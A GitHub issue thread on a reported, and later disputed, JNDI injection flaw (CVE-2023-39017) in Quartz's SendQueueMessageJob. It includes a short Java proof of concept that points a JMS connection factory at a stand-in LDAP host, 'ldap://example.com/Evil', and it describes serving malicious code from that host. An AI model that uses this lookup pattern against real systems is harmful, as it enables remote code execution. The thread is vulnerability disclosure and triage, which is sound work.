
[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fquartz-scheduler%2Fquartz%2Fissues%2F943)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fquartz-scheduler%2Fquartz%2Fissues%2F943)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=quartz-scheduler%2Fquartz)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[quartz-scheduler](/quartz-scheduler)
/
**[quartz](/quartz-scheduler/quartz)**
Public

* [Notifications](/login?return_to=%2Fquartz-scheduler%2Fquartz) You must be signed in to change notification settings
* [Fork
  1.9k](/login?return_to=%2Fquartz-scheduler%2Fquartz)
* [Star
   6.4k](/login?return_to=%2Fquartz-scheduler%2Fquartz)

* [Code](/quartz-scheduler/quartz)
* [Issues
  40](/quartz-scheduler/quartz/issues)
* [Pull requests
  11](/quartz-scheduler/quartz/pulls)
* [Discussions](/quartz-scheduler/quartz/discussions)
* [Actions](/quartz-scheduler/quartz/actions)
* [Projects
  0](/quartz-scheduler/quartz/projects)
* [Wiki](/quartz-scheduler/quartz/wiki)
* [Security](/quartz-scheduler/quartz/security)
* [Insights](/quartz-scheduler/quartz/pulse)

Additional navigation options

* [Code](/quartz-scheduler/quartz)
* [Issues](/quartz-scheduler/quartz/issues)
* [Pull requests](/quartz-scheduler/quartz/pulls)
* [Discussions](/quartz-scheduler/quartz/discussions)
* [Actions](/quartz-scheduler/quartz/actions)
* [Projects](/quartz-scheduler/quartz/projects)
* [Wiki](/quartz-scheduler/quartz/wiki)
* [Security](/quartz-scheduler/quartz/security)
* [Insights](/quartz-scheduler/quartz/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fquartz-scheduler%2Fquartz%2Fissues%2Fnew%2Fchoose)

By clicking ‚ÄúSign up for GitHub‚Äù, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We‚Äôll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fquartz-scheduler%2Fquartz%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# API misuse of `org.quartz.jobs.ee.jms.SendQueueMessageJob.execute` would lead the code injection vulnerability. #943

Open

[LetianYuan](/LetianYuan) opened this issue
Jul 19, 2023
¬∑ 32 comments

Open

# [API misuse of `org.quartz.jobs.ee.jms.SendQueueMessageJob.execute` would lead the code injection vulnerability.](#top) #943

[LetianYuan](/LetianYuan) opened this issue
Jul 19, 2023
¬∑ 32 comments

Labels
[needs:review](/quartz-scheduler/quartz/labels/needs%3Areview)
Needs review / investigation

## Comments

[![@LetianYuan](https://avatars.githubusercontent.com/u/52629090?s=80&v=4)](/LetianYuan)

Copy link

### **[LetianYuan](/LetianYuan)** commented [Jul 19, 2023](#issue-1812430014) ‚Ä¢ edited Loading

| **Affected Version** The latest version 2.3.2 and below.  **Describe the vulnerability** There is a method, `org.quartz.jobs.ee.jms.SendQueueMessageJob.execute(JobExecutionContext)`, designed to send a jms message. However, passing an unchecked argument to this API can lead to the execution of arbitrary commands. For instance, following codes can lead to the execution of arbitrary commands from attackers:  ```         JobExecutionContext context = new JobExecutionContext() {             ......              @Override             public JobDataMap getMergedJobDataMap() {                 JobDataMap map = new JobDataMap();                 map.put("jms.connection.factory", "ldap://example.com/Evil");                 return map;             }              ......         };         SendQueueMessageJob job = new SendQueueMessageJob();         job.execute(context);  ```  **Root Cause and Potential Danger**  The API is given more power than it should have, namely to just execute `lookup` without checking it. It violates the principle of least privilege. In this case, developers are not aware that the API used to send a jms message could execute arbitrary commands, leading to insufficient parameter validation and command execution.  We believe that this kind of implementation obscures the responsibility of security checks between the developers and the users of libraries, which has been confirmed by some developers. This issue is similar to the previously well-known Log4j2 vulnerability, where few developers knew that logging APIs could result in JNDI injection.  **To Reproduce** First, establish an LDAP server and provide malicious code. Then, just execute above codes would reproduce it.  **Fix Suggestion** Filter LDAP, RMI and related protocols when using `lookup`. |
| --- |
| The text was updated successfully, but these errors were encountered: |

 üëÄ
2
 devurandom and Omnibott6500 reacted with eyes emoji

All reactions

* üëÄ
  2 reactions

[![@carnil](https://avatars.githubusercontent.com/u/773068?s=80&u=54a9fd1cfc2b1abb34a487f17e07eb8a03cecdae&v=4)](/carnil)

Copy link

### **[carnil](/carnil)** commented [Aug 1, 2023](#issuecomment-1659919516)

| This issue seems to got assigned [CVE-2023-39017](https://github.com/advisories/GHSA-9jc9-7p44-pm6c "CVE-2023-39017") |
| --- |

All reactions

Sorry, something went wrong.

[![@ogross74](https://avatars.githubusercontent.com/u/6479360?s=80&v=4)](/ogross74)

Copy link

### **[ogross74](/ogross74)** commented [Aug 1, 2023](#issuecomment-1660115411)

| hi falks. is there an ETA for this? also, are you going to fix this on top of 2.3.2 or part of 2.4.0? |
| --- |

 üëÄ
12
 SeanRMunoz, wavejumper, propertius, theactionjackson, yuxiangdo, ChenyuWang98, Jarkko-10Duke, melazrak, Yeeler, caption-dylan, and 2 more reacted with eyes emoji

All reactions

* üëÄ
  12 reactions

Sorry, something went wrong.

[![@tinycage1026](https://avatars.githubusercontent.com/u/133618484?s=80&v=4)](/tinycage1026)

Copy link

### **[tinycage1026](/tinycage1026)** commented [Aug 2, 2023](#issuecomment-1661820243)

| This vulnerability is also recorded by Black Duck. It is numbered as BDSA-2023-1984 and its level is high. The score is 8.9. When will this vulnerability be fixed? |
| --- |

All reactions

Sorry, something went wrong.

[![@chadlwilson](https://avatars.githubusercontent.com/u/29788154?s=80&u=0454c715d0a8ab20d6f2e963a5aabcf1ed61aa7d&v=4)](/chadlwilson)

Copy link

### **[chadlwilson](/chadlwilson)** commented [Aug 4, 2023](#issuecomment-1665043168) ‚Ä¢ edited Loading

| I wonder if this was responsibly disclosed by some other means with more complete demonstration of the issue claimed? This seems incomplete and a bit speculative.  At first glance, this seems a bit dubious to me, in both severity and validity - but happy to be educated.  Does an "attacker" not need access to execute arbitrary code as a pre-requisite anyway, to populate the value of `JobDataMap` or customise `JobExecutionContext`? If they can do that, why would they stop here? They could write any kind of code?  Is it *reasonable* to think that the `JobDataMap` and job context is going to source configuration from arbitrary user input as an attack vector?  In canonical usage, I believe `JobExecutionContextImpl`s are created by `JobRunShell`s internally during initialization:     [quartz/quartz/src/main/java/org/quartz/core/JobRunShell.java](https://github.com/quartz-scheduler/quartz/blob/a5c4d27e963f51097f9b2777489d310a88897ca4/quartz/src/main/java/org/quartz/core/JobRunShell.java#L143)  Line 143 in [a5c4d27](/quartz-scheduler/quartz/commit/a5c4d27e963f51097f9b2777489d310a88897ca4)   |  | this.jec = new JobExecutionContextImpl(scheduler, firedTriggerBundle, job); | | --- | --- |      The `JobDataMap` is generally supplied via a `JobDetail`, and constructed via a `JobBuilder` like the below (or [in the docs](https://www.quartz-scheduler.org/documentation/quartz-2.3.0/quick-start.html)) - no need to subclass override like the PoC here.     [quartz/quartz/src/main/java/org/quartz/JobBuilder.java](https://github.com/quartz-scheduler/quartz/blob/a5c4d27e963f51097f9b2777489d310a88897ca4/quartz/src/main/java/org/quartz/JobBuilder.java#L306-L315)  Lines 306 to 315 in [a5c4d27](/quartz-scheduler/quartz/commit/a5c4d27e963f51097f9b2777489d310a88897ca4)   |  | /\*\* | | --- | --- | |  | \* Add the given key-value pair to the JobDetail's {@link JobDataMap}. | |  | \* | |  | \* @return the updated JobBuilder | |  | \* @see JobDetail#getJobDataMap() | |  | \*/ | |  | public JobBuilder usingJobData(String dataKey, Double value) { | |  | jobDataMap.put(dataKey, value); | |  | return this; | |  | } |      If folks are allowing untrusted user input into the construction of their `JobDetail` and `JobDataMap`s that configure JNDI+JMS in general, then that seems the real vulnerability to me. |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |

 üëç
6
 chrizel, anschnapp, jakobmagiera, hacker-szabo, jhouserizer, and zakdav reacted with thumbs up emoji

All reactions

* üëç
  6 reactions

Sorry, something went wrong.

[![@marcelstoer](https://avatars.githubusercontent.com/u/624195?s=80&u=482385737bcb897ad65ff00967ac3930ea95aa5f&v=4)](/marcelstoer)

Copy link

### **[marcelstoer](/marcelstoer)** commented [Aug 4, 2023](#issuecomment-1665069718)

| this seems a bit dubious to me  üëç  Does an "attacker" not need access to execute arbitrary code as a pre-requisite anyway  Not necessarily I think. If you   * replace the hard-coded `map.put("jms.connection.factory", "ldap://example.com/Evil")` with `map.put("jms.connection.factory", jmsConnectionFactoryUrl)` and * assume the value for `jmsConnectionFactoryUrl` is loaded from some configuration files   then the attacker won't need to alter existing binary code but would need access to the system to change configuration. This then leads to the same question you asked: why would they stop here? |
| --- |

 üëç
7
 chadlwilson, theactionjackson, Yeeler, chrizel, jakobmagiera, jhouserizer, and hacker-szabo reacted with thumbs up emoji

All reactions

* üëç
  7 reactions

Sorry, something went wrong.

[![@chadlwilson](https://avatars.githubusercontent.com/u/29788154?s=80&u=0454c715d0a8ab20d6f2e963a5aabcf1ed61aa7d&v=4)](/chadlwilson)

Copy link

### **[chadlwilson](/chadlwilson)** commented [Aug 4, 2023](#issuecomment-1665075094)

| Fair point [@marcelstoer](https://github.com/marcelstoer) - if an attacker has arbitrary access to alter code OR server side configuration you're in a dangerous place anyway, already breached by some other means. |
| --- |

All reactions

Sorry, something went wrong.

[![@maxqch](https://avatars.githubusercontent.com/u/30815181?s=80&v=4)](/maxqch)

Copy link

### **[maxqch](/maxqch)** commented [Aug 4, 2023](#issuecomment-1666133633)

| Is it correct to say that this is only relevant if you are using the [quartz-jobs](https://mvnrepository.com/artifact/org.quartz-scheduler/quartz-jobs) artifact, and anyone just using [quartz](https://mvnrepository.com/artifact/org.quartz-scheduler/quartz) shouldn't be affected? |
| --- |

 üëç
5
 chadlwilson, flexagon9, jhouserizer, moralistxp, and chaucern reacted with thumbs up emoji

All reactions

* üëç
  5 reactions

Sorry, something went wrong.

[![@marcelstoer](https://avatars.githubusercontent.com/u/624195?s=80&u=482385737bcb897ad65ff00967ac3930ea95aa5f&v=4)](/marcelstoer)

Copy link

### **[marcelstoer](/marcelstoer)** commented [Aug 4, 2023](#issuecomment-1666141115)

| [@maxqch](https://github.com/maxqch) we also noticed that the CPE matches any Quartz artifact and not just the affected one. |
| --- |

 üëç
3
 maxqch, TarasTielkes, and jwwallin reacted with thumbs up emoji

All reactions

* üëç
  3 reactions

Sorry, something went wrong.

[![@SergeS](https://avatars.githubusercontent.com/u/1794852?s=40&v=4)](/SergeS)
[SergeS](/SergeS)
mentioned this issue
[Aug 7, 2023](#ref-issue-1838994685)

[[FP]: quartz is reported instead of quartz-jobs
jeremylong/DependencyCheck#5862](/jeremylong/DependencyCheck/issues/5862)

Closed

[![@astonbitecode](https://avatars.githubusercontent.com/u/11261467?s=80&u=05f810898298c2cfae1e517f305ae18b40f9a32f&v=4)](/astonbitecode)

Copy link

### **[astonbitecode](/astonbitecode)** commented [Aug 8, 2023](#issuecomment-1669069518)

| [@maxqch](https://github.com/maxqch) we also noticed that the CPE matches any Quartz artifact and not just the affected one.  [@marcelstoer](https://github.com/marcelstoer), in case someone has a dependency to just `quartz`, they don't even have `org.quartz.jobs.ee.jms.SendQueueMessageJob` in the classpath. How is it possible the vulnerability to be active? |
| --- |

All reactions

Sorry, something went wrong.

[![@marcelstoer](https://avatars.githubusercontent.com/u/624195?s=80&u=482385737bcb897ad65ff00967ac3930ea95aa5f&v=4)](/marcelstoer)

Copy link

### **[marcelstoer](/marcelstoer)** commented [Aug 8, 2023](#issuecomment-1669091016)

| [@astonbitecode](https://github.com/astonbitecode) See the discussion at [jeremylong/DependencyCheck#5862](https://github.com/jeremylong/DependencyCheck/issues/5862) |
| --- |

 üëç
1
 astonbitecode reacted with thumbs up emoji

All reactions

* üëç
  1 reaction

Sorry, something went wrong.

[![@astonbitecode](https://avatars.githubusercontent.com/u/11261467?s=80&u=05f810898298c2cfae1e517f305ae18b40f9a32f&v=4)](/astonbitecode)

Copy link

### **[astonbitecode](/astonbitecode)** commented [Aug 8, 2023](#issuecomment-1669120888)

| Thanks [@marcelstoer](https://github.com/marcelstoer). However, I was interested in the vulnerability itself, not the DependencyCheck-related discussion.  [@maxqch](https://github.com/maxqch) asked a question whether someone is still affected, even if they just use [quartz](https://mvnrepository.com/artifact/org.quartz-scheduler/quartz) **and not** [quartz-jobs](https://mvnrepository.com/artifact/org.quartz-scheduler/quartz-jobs) artifact.  There is no explicit reply to this, instead the thumbs up reactions bellow the comment. I just wanted to be sure. |
| --- |

All reactions

Sorry, something went wrong.

[![@marcelstoer](https://avatars.githubusercontent.com/u/624195?s=80&u=482385737bcb897ad65ff00967ac3930ea95aa5f&v=4)](/marcelstoer)

Copy link

### **[marcelstoer](/marcelstoer)** commented [Aug 8, 2023](#issuecomment-1669130873) ‚Ä¢ edited Loading

| Sorry. I can't give you an authoritative answer to this as I didn't analyze it but *it looks like* the answer is no.  It would actually be something the folks who raised the issue in the first place should answer. Them being quiet further contributes to the dubious nature of this whole thing. |
| --- |

All reactions

Sorry, something went wrong.

[![@maxqch](https://avatars.githubusercontent.com/u/30815181?s=80&v=4)](/maxqch)

Copy link

### **[maxqch](/maxqch)** commented [Aug 8, 2023](#issuecomment-1669794621) via email

| I'm fairly certain you're not affected if you're not pulling in the actual artifact that contains this class. I just suppressed this cve. ‚Ä¶ On Tue, Aug 8, 2023, 1:13 AM Marcel St√∂r \*\*\*@\*\*\*.\*\*\*> wrote: Sorry. I can't give you an authoritative answer to this as I didn't analyze it but \*it looks like\* the answer is no. It would actually be something the folks who raised the issue in the first place should answer. Them being quiet only contributes to the dubious nature of this whole thing. ‚Äî Reply to this email directly, view it on GitHub <[#943 (comment)](https://github.com/quartz-scheduler/quartz/issues/943#issuecomment-1669130873)>, or unsubscribe <<https://github.com/notifications/unsubscribe-auth/AHLDHTJNMBSIUZ5MX66UBG3XUHYJLANCNFSM6AAAAAA2QIZKQM>> . You are receiving this because you were mentioned.Message ID: \*\*\*@\*\*\*.\*\*\*> |
| --- |

 üëç
4
 astonbitecode, xukun-cpu, MaroIsLife, and signalw reacted with thumbs up emoji

All reactions

* üëç
  4 reactions

Sorry, something went wrong.

[![@MaroIsLife](https://avatars.githubusercontent.com/u/26790542?s=80&u=748a1224715e6d4f466bbb514b8beb90f64239fe&v=4)](/MaroIsLife)

Copy link

### **[MaroIsLife](/MaroIsLife)** commented [Aug 10, 2023](#issuecomment-1673317286) ‚Ä¢ edited Loading

| I'm fairly certain you're not affected if you're not pulling in the actual artifact that contains this class. I just suppressed this cve.  I'd assume the CVE is detected if you're simply using `org.quartz-scheduler` dependency since all of quartz has a single CPE |
| --- |

All reactions

Sorry, something went wrong.

[![@chadlwilson](https://avatars.githubusercontent.com/u/29788154?s=80&u=0454c715d0a8ab20d6f2e963a5aabcf1ed61aa7d&v=4)](/chadlwilson)

Copy link

### **[chadlwilson](/chadlwilson)** commented [Aug 10, 2023](#issuecomment-1673477187)

| I'd assume the CVE is detected if you're simply using `org.quartz-scheduler` dependency since all of quartz has a single CPE  Correct, everything is `cpe:2.3:a:softwareag:quartz:*` in the NVD right now.  Having said all this, even if you **are** using quartz-jobs, the CVSSv3.1 base score of 9.8 seems a bit indefensible to me, and not demonstrated by the so-called "exploit". For all of these impact metrics, NVD seem to have just taken things at face value that remote code execution is possible.  It seems to be of very low value to trawl the internet for libraries that have Java `Context.lookup` usage (without specifically whitelisting protocols) without actually evaluating whether it is remotely reasonable to assume a library user might mistakenly pass a value from untrusted input.  Anyway, it seems possible that the goal here is likely to be to gain "street cred" or buff up a resume by reporting many CVEs across projects any time it is possible to write code that allows configuration of a JNDI or LDAP URL via `Context.lookup` where [JNDI injection](https://www.veracode.com/blog/research/exploiting-jndi-injections-java) is conceptually possible (entirely legitimate code to want to write, for the record, only dangerous in certain cases where a library user has no reason to believe something could be dangerous and is likely to pass data from user controlled input, e.g the log4j vulnerability).  Unfortunately anyone [can abuse the CVE process by reporting CVEs](https://hackaday.com/2023/07/07/this-week-in-security-bogus-cves-bogus-pocs-and-maybe-a-bogus-breach/); since there is seemingly little validation going on for CVE entries and everything appears to be taken largely at face value from reporters by MITRE. NVD can't possibly have expertise in the millions of libraries out there when they assess severity. Disputing a CVE seems basically impossible unless you are a big project, or at least heavily stacked against software maintainers - "guilty until proven innocent, or maybe never" (I've tried via both MITRE and NVD before). The entire benefit of the doubt is mysteriously given to largely anonymous reporters - not to maintainers or users. I suspect you have to be a mega-company with brand at stake to have the resources/energy to get disputed CVEs removed or re-assessed.  Even if this library *did* restrict `ldap://` and `rmi://` protocols, if you still allowed the connection factory to be passed from user controlled values, you'd be potentially allowing users to queue your jobs on their own malicious JMS servers which could exfiltrate your confidential data from your messages. |
| --- |

 üëç
8
 MaroIsLife, lcoller, veselov, pthiam-ep, l-tong, cvranjith, gg0h, and jhouserizer reacted with thumbs up emoji

All reactions

* üëç
  8 reactions

Sorry, something went wrong.

[![@ilatypov](https://avatars.githubusercontent.com/u/30419?s=80&u=c30b1c28618b204c64bd33d245f3c199c2b0481d&v=4)](/ilatypov)

Copy link

### **[ilatypov](/ilatypov)** commented [Aug 14, 2023](#issuecomment-1677543647) ‚Ä¢ edited Loading

| Let's avoid ad-hominem or group hate attacks. I changed my opinion 180¬∞ only after taking a bit closer look.  I misread the `quartz-jobs` code for availability of the respective quartz services, but it seems the use of JMS, JMX, EJB and mail in `quartz-jobs` are examples of performing the tasks rather than sending them to the server. It appears the `quartz` library does not have a network interface, and it can only load its tasks from a configuration file or programmatically.  I welcome the maintainers to dispute the particular CVE at a [MITRE CVE form](https://cveform.mitre.org/) because MITRE appears the numbering authority for the finding. Yes, guilty until proven is the unfortunate result of security concerns working their way through reverse engineering.  The highlighted JMS job example as well as other job examples (JMX invoker, mail sender, EJB) may look vulnerable due to a chance of abusing the host name parameters to abuse deserialization (using own code base) and/or denial of service (e.g. sending mail). The wiring of untrusted inputs into the jobs would have to be done by the application's own code, and therefore the job examples cannot be blamed. |
| --- |

 ‚ù§Ô∏è
4
 veselov, ilatypov, jhouserizer, and topolik reacted with heart emoji

All reactions

* ‚ù§Ô∏è
  4 reactions

Sorry, something went wrong.

[![@jbisotti](https://avatars.githubusercontent.com/u/899712?s=80&v=4)](/jbisotti)

Copy link

### **[jbisotti](/jbisotti)** commented [Aug 28, 2023](#issuecomment-1696308933)

| What's the ETA to fix this vulnerability?  I believe your initial reading of this thread missed some important points; give it another read. |
| --- |

All reactions

Sorry, something went wrong.

[![@marcelstoer](https://avatars.githubusercontent.com/u/624195?s=80&u=482385737bcb897ad65ff00967ac3930ea95aa5f&v=4)](/marcelstoer)

Copy link

### **[marcelstoer](/marcelstoer)** commented [Aug 29, 2023](#issuecomment-1697979656)

| I welcome the maintainers to dispute the particular CVE at a [MITRE CVE form](https://cveform.mitre.org/)  I have no idea where the maintainers are in all of this. However, I disputed this CVE with MITRE and they now at least added a "DISPUTED" note. |
| --- |

 üëç
6
 chadlwilson, ilatypov, pcgeng, tsologub, anton-seredkin-ibm, and jhouserizer reacted with thumbs up emoji

All reactions

* üëç
  6 reactions

Sorry, something went wrong.

[![@daneshk](https://avatars.githubusercontent.com/u/8402398?s=40&v=4)](/daneshk)
[daneshk](/daneshk)
mentioned this issue
[Aug 31, 2023](#ref-pullrequest-1873266047)

[Upgrade quartz dependency
ballerina-platform/module-ballerina-task#489](/ballerina-platform/module-ballerina-task/pull/489)
 Closed

5 tasks

[![@pcgeng](https://avatars.githubusercontent.com/u/13600428?s=80&u=b1820bf3aaf468fa952ce79fb247425118d94f54&v=4)](/pcgeng)

Copy link

### **[pcgeng](/pcgeng)** commented [Sep 1, 2023](#issuecomment-1702027139)

| Will your maintenance team fix this vulnerability in a future release? Or just ignore it? |
| --- |

 üëé
5
 jbisotti, chadlwilson, marcelstoer, TarasTielkes, and lucassaldanha reacted with thumbs down emoji

All reactions

* üëé
  5 reactions

Sorry, something went wrong.

[![@tbenr](https://avatars.githubusercontent.com/u/15999009?s=40&v=4)](/tbenr)
[tbenr](/tbenr)
mentioned this issue
[Sep 6, 2023](#ref-pullrequest-1881363592)

[updated quartz scheduler due to CVE.
Consensys/teku#7481](/Consensys/teku/pull/7481)
 Closed

2 tasks

[![@rolfyone](https://avatars.githubusercontent.com/u/2967240?s=80&u=bb6d83afa582749f9a68eadd01b7c5432f5d87a2&v=4)](/rolfyone)

Copy link

### **[rolfyone](/rolfyone)** commented [Sep 6, 2023](#issuecomment-1709138058)

| We've chosen to sit on the PR (teku) we've put up to see how this washes up, mostly because I'm (as a rule) not hugely a fan of moving to an RC, which is what the CVE suggests. Thanks for the discussion here it's been good context. For context our product is using this purely as a scheduler with no custom code capability, so we're fairly comfortable that the flagged problem is unlikely to directly affect our product... |
| --- |

All reactions

Sorry, something went wrong.

[![@sergeykad](https://avatars.githubusercontent.com/u/12783618?s=80&v=4)](/sergeykad)

Copy link

### **[sergeykad](/sergeykad)** commented [Sep 7, 2023](#issuecomment-1709743010)

| [@rolfyone](https://github.com/rolfyone) I understand that it is not a real issue, but unfortunately, it is not always easy to explain to management/client why the application is flagged for a critical vulnerability. Having a clean security report is important in itself. |
| --- |

All reactions

Sorry, something went wrong.

[![@LetianYuan](https://avatars.githubusercontent.com/u/52629090?s=40&v=4)](/LetianYuan)
[LetianYuan](/LetianYuan)
changed the title
~~There's a code injection vulnerability of `org.quartz.jobs.ee.jms.SendQueueMessageJob.execute`~~
API misuse of `org.quartz.jobs.ee.jms.SendQueueMessageJob.execute` would lead the code injection vulnerability.
[Sep 11, 2023](#event-10329452391)

[![@ilatypov](https://avatars.githubusercontent.com/u/30419?s=80&u=c30b1c28618b204c64bd33d245f3c199c2b0481d&v=4)](/ilatypov)

Copy link

### **[ilatypov](/ilatypov)** commented [Sep 13, 2023](#issuecomment-1716797366) ‚Ä¢ edited Loading

| [@sergeykad](https://github.com/sergeykad) Cleaning security reports cannot be done, in general, by purging all suspects or by suppressing their detection. In the future, the use of any coding pattern or component could be framed into a set of purpose statements such as intended input source ("configuration file" or "web request"), relation to other sub-projects ("exemplifies a hand-coded task in using the other project" or "implements the interface" or "sends a request to the other project").  In this particular case replacing convoluted sample tasks with simple ones such as those creating files or sending web requests to a specific REST endpoint could satisfy the shallow automated scanners. But offloading the deficiencies of the scanners onto the shoulders of the code creators does not seem fair or feasible in general. Businesses can work on their human-controlled risk detection systems or finance a verifiable, enforceable component and code pattern usage programming framework. |
| --- |

All reactions

Sorry, something went wrong.

[![@CalvinKirs](https://avatars.githubusercontent.com/u/16631152?s=80&u=c78f25faec0bc6b0ae188a8a20c6526110228eb3&v=4)](/CalvinKirs)

Copy link

### **[CalvinKirs](/CalvinKirs)** commented [Sep 19, 2023](#issuecomment-1724829594)

| Just a quick mention, do we have a complete security reporting process? Quartz has a large number of downstream users, and any discussions regarding security should be conducted privately rather than in a public place like GitHub Issues. |
| --- |

All reactions

Sorry, something went wrong.

[![@tdrwenski](https://avatars.githubusercontent.com/u/19999114?s=40&v=4)](/tdrwenski)
[tdrwenski](/tdrwenski)
mentioned this issue
[Sep 19, 2023](#ref-pullrequest-1903738023)

[Update spring security and suppress false positive CVE
Unidata/tds#419](/Unidata/tds/pull/419)
 Merged

[![@kalaiyarasiganeshalingam](https://avatars.githubusercontent.com/u/12771261?s=40&v=4)](/kalaiyarasiganeshalingam)
[kalaiyarasiganeshalingam](/kalaiyarasiganeshalingam)
mentioned this issue
[Oct 2, 2023](#ref-pullrequest-1915136458)

[Add quartz vulnerability to the ignore list
ballerina-platform/ballerina-lang#41453](/ballerina-platform/ballerina-lang/pull/41453)
 Merged

[![@j-blandford](https://avatars.githubusercontent.com/u/9812458?s=80&v=4)](/j-blandford)

Copy link

### **[j-blandford](/j-blandford)** commented [Oct 4, 2023](#issuecomment-1746805393)

| [@ilatypov](https://github.com/ilatypov) i wish it worked like that. we have a seperate part of our organisation (Audit or whatever) which is forcing us to fix this. what a stupid system |
| --- |

 üëç
1
 sergeykad reacted with thumbs up emoji

All reactions

* üëç
  1 reaction

Sorry, something went wrong.

[![@pcgeng](https://avatars.githubusercontent.com/u/13600428?s=80&u=b1820bf3aaf468fa952ce79fb247425118d94f54&v=4)](/pcgeng)

Copy link

### **[pcgeng](/pcgeng)** commented [Oct 25, 2023](#issuecomment-1778399344)

| I see there is a RC version: [Quartz 2.4.0 RC2](https://github.com/quartz-scheduler/quartz/releases/tag/quartz-2.4.0-rc2), will it resolve this vulnerability? |
| --- |

All reactions

Sorry, something went wrong.

[![@j-blandford](https://avatars.githubusercontent.com/u/9812458?s=80&v=4)](/j-blandford)

Copy link

### **[j-blandford](/j-blandford)** commented [Oct 25, 2023](#issuecomment-1778653947)

| [@pcgeng](https://github.com/pcgeng) yes it fixes it for me (that was the recommended version provided by my tooling), but I'm getting lots of "Cast Exceptions for FileScanner" when trying to use it. The jobs work as expected, it just clutters my logs a LOT |
| --- |

 üëç
1
 pcgeng reacted with thumbs up emoji

All reactions

* üëç
  1 reaction

Sorry, something went wrong.

[![@kalaiyarasiganeshalingam](https://avatars.githubusercontent.com/u/12771261?s=40&v=4)](/kalaiyarasiganeshalingam)
[kalaiyarasiganeshalingam](/kalaiyarasiganeshalingam)
mentioned this issue
[Dec 1, 2023](#ref-issue-2020653541)

[Upgrade quartz dependency
ballerina-platform/ballerina-library#5847](/ballerina-platform/ballerina-library/issues/5847)

Open

[![@Dragas](https://avatars.githubusercontent.com/u/6078508?s=80&v=4)](/Dragas)

Copy link

### **[Dragas](/Dragas)** commented [Jan 12, 2024](#issuecomment-1888607769)

| So to trigger this vulnerability you need   * Either   + Permit arbitrary jms connection factory value (controlled by external party)   + Permit arbitrary key values in job context * Use quartz-jobs artifact   Am I reading this correctly? |
| --- |

All reactions

Sorry, something went wrong.

[![@rbertucat](https://avatars.githubusercontent.com/u/963014?s=40&u=071d862b1f71b95920118ffc62002c1df5124590&v=4)](/rbertucat)
[rbertucat](/rbertucat)
mentioned this issue
[Feb 13, 2024](#ref-issue-2046381920)

[Fix for CVE-2023-39017 in version 2.3.X?
#1092](/quartz-scheduler/quartz/issues/1092)

Closed

[![@rbertucat](https://avatars.githubusercontent.com/u/963014?s=80&u=071d862b1f71b95920118ffc62002c1df5124590&v=4)](/rbertucat)

Copy link

### **[rbertucat](/rbertucat)** commented [Feb 28, 2024](#issuecomment-1968623291)

